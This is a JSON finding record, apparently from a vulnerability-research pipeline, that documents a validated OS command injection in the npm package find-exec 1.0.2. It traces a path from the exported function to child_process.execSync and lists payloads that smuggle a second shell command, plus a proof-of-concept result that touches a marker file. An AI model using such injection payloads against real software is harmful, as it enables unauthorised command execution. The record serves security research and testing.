@@ -1,0 +1,107 @@
+{
+  "finding_id": "jsflow/os_command/2",
+  "normalized_from": "report",
+  "vulnerability_type": "os_command",
+  "target": {
+    "package_root": "evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src",
+    "entry_file": "index.js",
+    "require_path": "../../explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src",
+    "entry_function": null,
+    "exported_symbol_kind": "function",
+    "module_mode": true,
+    "export_style": "commonjs",
+    "is_async": false
+  },
+  "invocation": {
+    "mode": "direct_call",
+    "candidate_calls": [
+      "target(payload)"
+    ]
+  },
+  "source": {
+    "kind": "tainted_flow",
+    "symbol": "module.exports",
+    "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+    "line": 4
+  },
+  "sink": {
+    "symbol": "child_process.execSync",
+    "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+    "line": 20,
+    "code": "20:     exec(command, { stdio: 'ignore' })"
+  },
+  "trace": {
+    "path_text": "module.exports argument -> findCommand(command) -> isExec(command) -> child_process.execSync(command)",
+    "nodes": [
+      {
+        "id": "39",
+        "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+        "line": 4,
+        "code": "4: module.exports = function(){"
+      },
+      {
+        "id": "52",
+        "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+        "line": 5,
+        "code": "5:   var commands = Array.isArray(arguments[0]) ? arguments[0] : Array.prototype.slice.apply(arguments)"
+      },
+      {
+        "id": "86",
+        "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+        "line": 8,
+        "code": "8:   commands.some(function(c){"
+      },
+      {
+        "id": "201",
+        "file": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src/index.js",
+        "line": 32,
+        "code": "32:     return \"command -v \" + command"
+      },
+      {
+        "id": "313",
+        "file": "/Users/rainoftime/Work/analysis/jsflow/builtin_packages/child_process.js",
+        "line": 16,
+        "code": "16:   sink_hqbpillvul_execSync(sink);"
+      }
+    ]
+  },
+  "constraints": {
+    "available": true,
+    "payload_candidates": [
+      {
+        "input": "module.exports.execSync",
+        "candidate": "\"; touch exploited #",
+        "reason": "Recovered from jsflow exploit result status=solved"
+      },
+      {
+        "input": "module.exports.exec",
+        "candidate": "& touch exploited #",
+        "reason": "Recovered from jsflow exploit result status=solved"
+      }
+    ]
+  },
+  "oracle": {
+    "type": "file_exists",
+    "file_path": "/tmp/jsflow_report_skill_marker",
+    "notes": "The sink suppresses stdout, so a marker file is the clearest observable oracle."
+  },
+  "environment": {
+    "cwd": "/Users/rainoftime/Work/analysis/jsflow/evaluation/explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src",
+    "notes": "Recovered from jsflow report logs/20260312_220311/report.json and refined to the direct exported call."
+  },
+  "validation": {
+    "status": "validated",
+    "run_command": "node poc.js",
+    "observed_output": "JSFLOW_POC_SUCCESS ; touch /tmp/jsflow_report_skill_marker"
+  },
+  "raw_jsflow": {
+    "report_finding_id": "jsflow/os_command/2",
+    "report_status": "exploit_only",
+    "report_message": "jsflow solved exploit-like payloads for this path, but rule matching failed.",
+    "report_log_dir": "logs/20260312_220311"
+  },
+  "assumptions": [
+    "The default CommonJS export is the simplest valid invocation model.",
+    "The local shell honors ';' separators."
+  ]
+}
